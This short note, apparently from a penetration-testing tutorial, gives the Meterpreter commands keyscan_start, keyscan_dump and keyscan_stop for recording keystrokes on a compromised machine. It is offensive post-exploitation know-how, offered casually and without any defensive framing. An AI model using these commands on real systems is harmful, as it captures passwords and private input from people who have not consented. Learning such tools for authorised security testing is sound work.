You can create a temp keylogger within the system using the command:
keyscan_start

To dump what meterpreter has keylogged, it is:
keyscan_dump

and then stop it with:
keyscan_stop

In order to find log some cheeky keys.
